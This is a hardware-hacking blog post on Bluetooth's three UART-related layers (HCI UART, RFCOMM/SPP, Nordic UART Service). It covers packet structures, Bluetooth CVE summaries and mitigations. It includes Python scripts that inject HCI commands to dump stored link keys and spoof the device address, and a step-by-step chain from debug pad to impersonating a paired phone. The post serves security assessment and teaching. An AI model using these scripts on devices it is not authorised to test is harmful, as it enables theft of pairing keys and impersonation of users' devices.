---
title: "Bluetooth and UART: The Hidden Wire Inside Every Wireless Chip"
date: "2026-04-26"
description: "Is Bluetooth UART? Kind of. The full story behind HCI UART, RFCOMM, Nordic UART Service, packet structures, HCI command injection, and every CVE worth knowing when you have physical access to the wire."
tags: ["bluetooth", "UART", "HCI", "hardware hacking", "CVE", "embedded security", "BLE"]
---

*You cracked open the enclosure. There is a Bluetooth chip and there is a UART pad. Same pad? Different pad? Does it matter? Yes. More than you think.*

---

### <span style="color: orange;">The Question People Keep Getting Wrong</span>

"Is Bluetooth UART?" gets asked constantly in hardware hacking circles. The answer is: yes and no, and understanding exactly where the line sits will let you do things to a Bluetooth device that most people never think to try.

There are three completely different places where UART meets Bluetooth:

1. **HCI UART** - the physical wire between your SoC and the Bluetooth radio chip
2. **RFCOMM / SPP** - the Bluetooth Classic profile that pretends to be a serial port over the air
3. **Nordic UART Service (NUS)** - a BLE GATT service that emulates serial over BLE

Each one has different attack surface. Each one has its own CVE history. We will go through all three.

---

### <span style="color: orange;">Layer 1: HCI UART - The Wire Nobody Talks About</span>

Most commodity hardware separates the application processor from the Bluetooth radio. The gap between them is filled with HCI: Host Controller Interface.

HCI was designed to be transport-agnostic. You can run it over USB, SDIO, SPI, or UART. On embedded devices, UART is the dominant choice because it is cheap, needs only four wires (TX, RX, RTS, CTS), and every microcontroller ever made has at least one.

```
Application Processor                Bluetooth Radio (Controller)
+--------------------------+         +---------------------------+
| BT Stack (BlueZ/Zephyr)  |         |  HCI Firmware             |
|  L2CAP / RFCOMM / GATT   |         |  Baseband                 |
|  HCI Host layer          |<--UART->|  HCI Controller layer     |
+--------------------------+         |  RF                       |
                                     +---------------------------+
```

The baud rate on this link is typically 115200 baud during boot, then the host sends an HCI Vendor Specific command to switch to 3 Mbit/s or 4 Mbit/s for normal operation. The exact speed depends on the chip vendor.

**Common HCI UART baud rates by chip family:**

| Chip | Boot baud | Operational baud |
|------|-----------|-----------------|
| TI CC2564 | 115200 | 3000000 |
| Broadcom BCM4343 | 115200 | 3000000 |
| Qualcomm WCN3980 | 115200 | 3200000 |
| Nordic nRF52840 (UART HCI) | 115200 | 1000000 |
| Realtek RTL8723 | 115200 | 1500000 |

The switch happens via `HCI_Reset` followed by a vendor-specific baud change command. If you tap the wire at boot before the switch, you catch it at 115200. If you tap after, you get garbage until you figure out the new rate.

---

### <span style="color: orange;">HCI Packet Structure - What Travels on the Wire</span>

HCI defines four packet types. Each one starts with a single indicator byte:

```
0x01  Command packet    (Host -> Controller)
0x02  ACL data packet   (both directions)
0x03  SCO data packet   (audio, both directions)
0x04  Event packet      (Controller -> Host)
```

**HCI Command packet layout:**

```
+---------+-----------+--------+----------+
| Type    | Opcode    | ParLen | Params   |
| 1 byte  | 2 bytes   | 1 byte | 0-255 B  |
+---------+-----------+--------+----------+
  0x01     [OGF|OCF]
```

Opcode is split into OGF (Opcode Group Field, 6 bits) and OCF (Opcode Command Field, 10 bits):

```
Bit 15-10: OGF
Bit 9-0:   OCF

OGF 0x01  Link Control commands    (inquiry, connect, disconnect)
OGF 0x02  Link Policy commands     (role switch, hold mode)
OGF 0x03  Controller & Baseband   (reset, write scan enable, write auth)
OGF 0x04  Informational params     (read BD_ADDR, read local features)
OGF 0x3F  Vendor Specific          (chip-specific, no standard)
```

A real HCI Reset command looks like this on the wire:

```
01 03 0C 00
^  ^---- opcode 0x0C03 (OGF=0x03, OCF=0x003 = HCI_Reset)
^--- type = command
         ^--- parameter total length = 0
```

The controller responds with an event:

```
04 0E 04 01 03 0C 00
^  ^  ^  ^  ^----- opcode echoed back
^  ^  ^  ^--- num_hci_command_packets = 1
^  ^  ^--- parameter total length = 4
^  ^--- event code 0x0E = Command Complete
^--- type = event
```

**HCI ACL Data packet:**

```
+---------+--------------------+--------+----------+
| Type    | Handle+Flags       | DataLen| Data     |
| 1 byte  | 2 bytes            | 2 bytes| variable |
+---------+--------------------+--------+----------+
  0x02
```

The lower 12 bits of the handle field identify which ACL connection. The upper 4 bits are packet boundary and broadcast flags. This is how L2CAP data rides inside HCI.

---

### <span style="color: orange;">What You Can Do With Physical HCI UART Access</span>

If you can tap or inject on the HCI UART line, you are operating below the Bluetooth security model. Pairing, authentication, and encryption happen at the controller level, but you are talking directly to the controller's HCI port.

**What the host normally does at startup:**

```
Host sends: HCI_Reset
Host sends: HCI_Read_Local_Version_Information
Host sends: HCI_Write_Scan_Enable (value=0x03 = inquiry+page scan)
Host sends: HCI_Write_Class_Of_Device
Host sends: HCI_Write_Local_Name
Host sends: HCI_LE_Set_Event_Mask
Host sends: HCI_LE_Set_Advertising_Parameters
Host sends: HCI_LE_Set_Advertising_Data
Host sends: HCI_LE_Set_Advertise_Enable
```

If you replay or inject this sequence with modified parameters, you can:

- Change the device name without rebooting the host application
- Enable inquiry scan (make the device discoverable) even if the firmware explicitly disabled it
- Inject ACL data frames that get delivered to the host stack as if they came from a paired peer
- Send `HCI_Write_Authentication_Enable` with value `0x00` to disable authentication requirements
- Read the stored link keys from the controller with `HCI_Read_Stored_Link_Key`

That last one is devastating. If the controller stores bonding keys (which most do), you can extract them over the UART debug port without ever needing to pair, sniff, or crack anything.

**Reading stored link keys:**

```python
import serial, time

s = serial.Serial('/dev/ttyS1', 115200)

# HCI_Read_Stored_Link_Key, BD_ADDR=00:00:00:00:00:00 (wildcard), read_all=1
cmd = bytes([0x01, 0x0D, 0x0C, 0x07,
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # BD_ADDR wildcard
             0x01])                                 # read_all = 1
s.write(cmd)
time.sleep(0.1)
response = s.read(s.in_waiting)
print(response.hex())
```

The response will be an event containing every link key stored on the controller. These are 128-bit values. With a link key you can impersonate the paired device to the target on any other radio.

---

### <span style="color: orange;">Layer 2: RFCOMM and SPP - Serial Port Profile Over the Air</span>

This is what most people mean when they say "Bluetooth UART." SPP uses RFCOMM, which uses L2CAP, which uses ACL, which uses HCI. The chain is:

```
Application data
      |
   RFCOMM (emulates RS-232 serial port)
      |
   L2CAP (logical link, fragmentation, MTU)
      |
   ACL (asynchronous connectionless link)
      |
   LMP (link manager protocol - handles auth/encryption)
      |
   Baseband (scheduling, frequency hopping)
      |
   Radio (2.4 GHz, FHSS, 79 channels)
```

RFCOMM is based on GSM TS 07.10 (a mobile phone multiplexing standard from the 1990s). It uses a subset of that framing protocol on top of L2CAP.

**RFCOMM frame structure:**

```
+--------+--------+--------+----------+--------+--------+
| Address| Control| Length | Credits  | Data   | FCS    |
| 1 byte | 1 byte | 1-2 B  | 0-1 byte | var    | 1 byte |
+--------+--------+--------+----------+--------+--------+
```

Address byte breakdown:
```
Bit 0:    EA (extended address, always 1 for RFCOMM)
Bit 1:    C/R (command/response)
Bit 2-7:  DLCI (Data Link Connection Identifier)
```

DLCI 0 is the control channel. DLCI 1 and higher are actual data channels. When SPP opens a connection, it negotiates a DLCI and all serial data flows through UIH (Unnumbered Information with Header check) frames on that DLCI.

**RFCOMM frame types:**

| Control byte | Frame type | Purpose |
|---|---|---|
| 0x3F | SABM | Connect request |
| 0x73 | UA | Unnumbered Acknowledgment |
| 0x0F | DM | Disconnected Mode |
| 0x43 | DISC | Disconnect |
| 0xEF | UIH | Data frame |
| 0xFF | UIH with PF | Data frame with poll/final |

The FCS is calculated over Address + Control + Length (not the data payload for UIH frames, which is the catch described in CVE-2022-20345).

**A full SPP connection setup looks like:**

```
Initiator                              Responder
    |                                      |
    |-- L2CAP Connect Req (PSM=0x0003) --> |
    |<-- L2CAP Connect Rsp (success) ----- |
    |-- L2CAP Config Req (MTU=1013) -----> |
    |<-- L2CAP Config Rsp (accept) ------- |
    |                                      |
    |-- RFCOMM SABM (DLCI=0) -----------> |  (open control channel)
    |<-- RFCOMM UA (DLCI=0) ------------- |
    |                                      |
    |-- RFCOMM UIH (DLC PN, DLCI=1) ----> |  (negotiate data channel)
    |<-- RFCOMM UIH (DLC PN, DLCI=1) ---- |
    |                                      |
    |-- RFCOMM SABM (DLCI=1) -----------> |  (open data channel)
    |<-- RFCOMM UA (DLCI=1) ------------- |
    |                                      |
    |-- RFCOMM UIH data ----------------> |  (serial data flowing)
    |<-- RFCOMM UIH data ----------------- |
```

SPP has zero application-layer authentication by default. If pairing mode is `JustWorks`, there is no PIN. If the device has SSP disabled and uses a legacy `0000` or `1234` PIN, you can pair and then open an SPP channel and you have a serial console.

---

### <span style="color: orange;">Layer 3: Nordic UART Service (NUS) - BLE Serial</span>

BLE does not have RFCOMM. Nordic Semiconductor invented a convention called NUS as a GATT service to fill the gap:

```
Service UUID:   6E400001-B5A3-F393-E0A9-E50E24DCCA9E
TX Characteristic: 6E400002-... (write, write-without-response)
RX Characteristic: 6E400003-... (notify)
```

"TX" and "RX" are named from the device's perspective, which is backwards from what you expect as an attacker. To send data to the device, you write to the TX characteristic. Data from the device comes as notifications on RX.

This is not a standard. It is a convention. Many Chinese BLE modules (HM-10, AT-09, JDY-08) implement it. Many custom firmware projects implement compatible versions. The UUID prefix `6E400001` will show up in `btlejuice`, `gatttool`, or `bettercap ble.enum` results.

**Packet structure:** There is none. NUS is a raw byte pipe. The ATT MTU (default 23 bytes, negotiable up to 512 bytes) is the only framing. Large transfers get split at the ATT layer.

**Security on NUS:** Depends entirely on whether the GATT server marks the characteristics as requiring bonding. Most modules do not. You can write to TX and subscribe to RX without any pairing at all if the device is advertising and accepts connections.

---

### <span style="color: orange;">Configuration Packets - What the Firmware Sends Before Anything Works</span>

This is the initialization sequence you will see on the HCI UART after a power-on reset, reconstructed from a typical Broadcom/Cypress chip (BCM43xx family):

```
[Host -> Controller] HCI_Reset
[Controller -> Host] Command Complete (HCI_Reset)
[Host -> Controller] HCI_Read_Local_Version_Information
[Controller -> Host] Command Complete (version data)
[Host -> Controller] HCI_VSC_Download_Minidriver        (OGF=0x3F, OCF=0x2E)
[Controller -> Host] Command Complete
[Host -> Controller] HCI_VSC_Write_RAM (patch chunks)   (OGF=0x3F, OCF=0x4C)
      ... (repeated for every 59-byte patch chunk) ...
[Host -> Controller] HCI_VSC_Launch_RAM (entry point)   (OGF=0x3F, OCF=0x4E)
[Controller -> Host] Command Complete
[Host -> Controller] HCI_VSC_Update_UART_Baud_Rate      (OGF=0x3F, OCF=0x18)
[Controller -> Host] Command Complete
      ... now running at 3 Mbit/s ...
[Host -> Controller] HCI_Write_BD_ADDR                  (OGF=0x3F, OCF=0x01)
[Host -> Controller] HCI_Write_Local_Name
[Host -> Controller] HCI_Write_Scan_Enable
```

The firmware patch download sequence is the most interesting part. The controller boots from ROM. The host downloads a RAM patch to enable features, fix bugs, and configure the radio. If you can intercept and modify `HCI_VSC_Write_RAM`, you can patch the Bluetooth firmware in flight.

Beken, Realtek, and Qualcomm all do variations of this. The specific VSC opcodes differ but the concept is identical. The firmware executing inside the Bluetooth chip is not fixed at manufacturing time on most devices.

---

### <span style="color: orange;">Security Issues and Known CVEs</span>

**BlueBorne (2017) - CVE-2017-0781, CVE-2017-0782, CVE-2017-0783, CVE-2017-0785**

Four vulnerabilities in Android's Bluetooth stack (Bluedroid). The worst two (CVE-2017-0781 and CVE-2017-0782) were heap overflows in the BNEP (Bluetooth Network Encapsulation Protocol) handler. CVE-2017-0783 was an information leak in BNEP. CVE-2017-0785 was an information leak in SDP.

The critical point: BlueBorne required zero user interaction and zero pairing. An attacker within radio range could achieve RCE without the target accepting anything. The BNEP vulnerability was in a service that was running and listening whenever Bluetooth was enabled, regardless of discoverability.

The root was in the BNEP `bnep_data_ind()` function which parsed extension header types without bounds checking. An oversized response to a `BNEP_SETUP_CONNECTION_REQUEST` would overflow the stack before authentication was required.

**KNOB Attack (2019) - CVE-2019-9506**

KNOB stands for Key Negotiation of Bluetooth. The Bluetooth Classic spec allows negotiating the entropy of the session key during LMP (Link Manager Protocol) pairing. The specification allowed entropy as low as 1 byte. An attacker in the middle could force both sides to agree to 1-byte entropy and then brute-force the session key in real time.

The attack required the attacker to be in range during the LMP negotiation phase. Encrypted ACL traffic could then be decrypted. The fix was a minimum entropy requirement (7 bytes) in the spec and most vendors patched to enforce this.

**BIAS Attack (2020) - CVE-2020-10135**

Bluetooth Impersonation AttackS. The Bluetooth Classic spec's Secure Simple Pairing flow had a logic flaw: a device could claim to be a master during authentication, and if it successfully authenticated as a master it could then switch roles to slave and skip the mutual authentication step. This let an attacker impersonate a previously paired device without knowing its link key.

Combined with a stored link key extraction via HCI UART (described above), this becomes a complete attack: extract keys physically, then impersonate remotely.

**SweynTooth (2020) - CVE-2020-10061 through CVE-2020-10069**

A family of BLE stack vulnerabilities across multiple chip vendors (Texas Instruments CC2640, Cypress CYBLE, Dialog DA14580, Microchip ATBTLC1000, STMicro BlueNRG, Telink TLSR8266, NXP KW41Z). The vulnerabilities were in how each vendor's BLE stack handled malformed L2CAP packets, ATT packets, and the Link Layer.

Key ones:

- **Crash with LLID=0**: Sending an LL PDU with reserved LLID value 0 crashed most stacks completely
- **Invalid L2CAP fragment**: Sending a continuation L2CAP fragment without a preceding start fragment caused heap corruption on some chips
- **Invalid Connection Request**: Sending a connection request with invalid parameters caused stack overflows on TI CC2640

These hit medical devices, smart locks, and industrial equipment running these exact SDKs.

**BrakTooth (2021) - CVE-2021-28139 through CVE-2021-34147**

16 vulnerabilities in Bluetooth Classic stacks across 11 major SoC vendors. The name comes from the Norwegian word for crash. The attack surface was the LMP (Link Manager Protocol) state machine.

Most impactful:

- **CVE-2021-28139**: ESP32 BT stack overflow via malformed LMP_features_res. An oversized response caused a 1408-byte stack smash. Code execution on the ESP32 BT core without any pairing.
- **CVE-2021-34147**: Infineon CYW920819 deadlock via LMP_max_slot + LMP_max_slot_res sequence. Permanent DoS.
- **CVE-2021-34145**: Intel AX200 complete crash via truncated LMP_accepted packet.

All BrakTooth vulnerabilities are reachable without pairing. The LMP layer handles connection setup before authentication. Malformed packets at this layer bypass all higher-layer security.

**HCI UART Injection (no CVE, architectural)**

This is not a CVE but it is a real attack class. If you have UART access to the HCI bus, you are below the security model. This is relevant because:

- Debug pads on PCBs are almost always connected to HCI UART, not application UART
- Many devices have UART test points on the board that connect to the Bluetooth chip
- Some devices use the same UART for both application console and HCI, switchable by a GPIO

Once you can inject HCI commands you can read link keys, disable authentication, change the MAC address, force the device into pairing mode, and inject arbitrary data into active RFCOMM connections.

**CVE-2022-20345 - Android RFCOMM out-of-bounds write**

The RFCOMM UIH FCS calculation in Android's Bluedroid was done correctly, but the handler for malformed UIH frames with the P/F bit set and payload length mismatches allowed an out-of-bounds write in the RFCOMM timer-based retransmission buffer. Exploitable over an authenticated Bluetooth connection to achieve privilege escalation.

**CVE-2023-45866 - Bluetooth HID unauthenticated keystroke injection**

Not UART-specific but worth knowing. Linux, Android, macOS, and iOS all accepted Bluetooth HID (Human Interface Device) connections from unauthenticated devices when the host was in certain discoverable states. An attacker could inject keystrokes without any pairing.

The mechanism: Bluetooth HID uses L2CAP PSM 0x0011 (HID Control) and PSM 0x0013 (HID Interrupt). On the affected stacks, these PSMs did not require authentication before accepting connections. An attacker could open an L2CAP channel to PSM 0x0013 and send HID reports (keyboard scancodes) and they would be processed as input.

---

### <span style="color: orange;">HCI UART Sniffing - What the Setup Looks Like</span>

If you want to tap the HCI UART line on a device you are testing:

**Hardware needed:**
- Logic analyzer (Saleae Logic 8 or similar, minimum 4 channels)
- Probe clips or fine-pitch probes (0.5mm pitch is common)
- Oscilloscope to confirm voltage levels (1.8V, 2.8V, or 3.3V are all common)

**Finding the HCI UART:**

The Bluetooth chip datasheet will list the UART pins. If you do not have the datasheet, look for:
- Two traces from the BT module to the SoC
- They will be among a small group of signals (typically 4: TX, RX, RTS, CTS)
- The TX line will idle high and toggle at boot
- At 115200 baud the shortest pulse is 8.68 microseconds

**Decoding with sigrok / PulseView:**

```
Protocol: UART
Baud rate: 115200 (start here, switch to 3000000 if you see garbage after ~500ms)
Data bits: 8
Parity: none
Stop bits: 1
Bit order: LSB first
Idle state: high
```

Once you have the decoded bytes, parse them against the HCI packet format. The first byte of every packet is the type indicator (0x01/0x02/0x03/0x04). The sequence is synchronous enough that you can parse it linearly from reset.

**Injecting commands:**

```python
import serial

# Connect to HCI UART directly (bypass the host BT stack)
# First: kill the host stack so it stops talking to the controller
# $ sudo systemctl stop bluetooth
# $ sudo rmmod btusb hci_uart  (or the relevant module)

s = serial.Serial('/dev/ttyS1', 115200, rtscts=True)

def send_hci_cmd(ogf, ocf, params=b''):
    opcode = (ogf << 10) | ocf
    pkt = bytes([0x01,
                 opcode & 0xFF,
                 (opcode >> 8) & 0xFF,
                 len(params)]) + params
    s.write(pkt)
    return s.read(64)

# Read BD_ADDR
resp = send_hci_cmd(0x04, 0x009)
bd_addr = resp[7:13]
print("BD_ADDR:", ':'.join(f'{b:02X}' for b in reversed(bd_addr)))

# Write a new BD_ADDR (vendor specific, works on most chips)
new_addr = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01])
send_hci_cmd(0x3F, 0x001, new_addr)

# Read all stored link keys
send_hci_cmd(0x03, 0x00D, b'\x00\x00\x00\x00\x00\x00\x01')
```

---

### <span style="color: orange;">Why Vendors Use UART for HCI</span>

The answer is boring and correct: cost and universality.

USB HCI requires a USB PHY and adds licensing complexity. SDIO is faster but needs more pins and a more complex host driver. SPI is bidirectional but requires chip-select management and a separate interrupt line.

UART needs two wires minimum (four with flow control). Every MCU has at least one. The driver is 50 lines of code. The silicon cost is near zero. For a device that ships 50 million units per year, that matters.

The downside is that UART has no inherent access control. USB at least has enumeration and descriptor negotiation before data flows. UART is just voltages. If you can reach the pads, you are talking to the chip.

This is why HCI UART pads on production boards are the first thing a hardware security reviewer looks for. The ones that are test-only and physically disconnected at the SoC are fine. The ones that are active and accessible through a debug connector are a complete bypass of every Bluetooth security feature the device implements.

---

### <span style="color: orange;">Practical Attack Chain: From UART Pad to Network Access</span>

This is a real attack path that has worked on production consumer devices:

```
1. Open device enclosure
2. Locate Bluetooth chip (usually labeled, or visible on FCC photos)
3. Find UART pads using oscilloscope (4 probes, measure for baud at boot)
4. Determine HCI UART vs application UART (HCI starts with 01 03 0C 00 = HCI_Reset)
5. Kill host BT stack to stop it fighting you for the UART
6. Send HCI_Read_Stored_Link_Key (opcode 0x0C0D)
7. Receive link keys for all previously paired devices
8. Power device back on, let host stack reconnect
9. Use extracted link key with spoofed MAC to impersonate paired phone
10. Receive SPP data that the phone sends to the "device" (now you)
```

Steps 9 and 10 are the BIAS attack in practice. You do not crack the link key. You extract it in plaintext and replay it. The Bluetooth spec has no protection against this because storing the key was the intended design.

---

### <span style="color: orange;">Mitigations That Actually Work</span>

**For device manufacturers:**

- Remove or physically destroy HCI UART test pads before shipping. Cut the trace if you must.
- If UART must remain accessible for firmware update, implement a challenge-response gate at the UART layer before any HCI command is accepted.
- Use secure element storage for link keys instead of the controller's internal NVM.
- Enforce minimum LMP entropy (>= 16 bytes) at the application stack level as a defense-in-depth measure against KNOB.
- Pin firmware version and reject unauthorized HCI VSC patch downloads.

**For BLE peripheral developers:**

- Mark NUS characteristics as requiring bonding (`BT_GATT_PERM_WRITE_AUTHEN` in Zephyr, `setPermissions(PERMISSION_WRITE_ENCRYPTED_MITM)` in Android).
- Use LE Secure Connections (LESC) pairing mode. Do not fall back to legacy pairing.
- Implement application-layer authentication on top of NUS data. Do not trust the BLE transport layer alone.

**For security researchers doing assessment:**

- Always check FCC ID photos before opening the device. The internal photos show test pad locations.
- Enumerate HCI UART before assuming you need the application console.
- Try `HCI_Read_Stored_Link_Key` before attempting any radio-based attack. Physical is faster than wireless.

---

*Part of the hardware security series. The previous entries covered UART from bit timing through fault injection. This one is about the wireless chip that shares the same wire.*

![Bluetooth HCI UART stack diagram](/blog/uart/parity-bits-explained.svg)
